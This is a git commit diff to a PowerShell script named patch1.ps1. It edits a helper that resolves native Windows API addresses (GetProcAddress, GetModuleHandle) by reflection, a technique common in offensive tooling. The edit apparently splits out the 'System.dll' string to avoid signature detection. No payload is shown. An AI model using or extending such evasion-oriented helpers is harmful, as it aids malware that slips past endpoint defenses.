aa1d45b1e4319f655fb5615b9eaf2813e65e1629
74l4r14 <98590947+74l4r14@users.noreply.github.com>
2025-11-05 16:12:38 +0000

    Update patch1.ps1

--- patch1.ps1
+++ patch1.ps1
@@ -2,7 +2,8 @@
 #use native methods to lookup function addresses
 function LookupFunc {
     Param ($moduleName, $functionName)
-    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $system = "System.dll"
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($system)}).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
     $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
     [IntPtr] $result = 0;
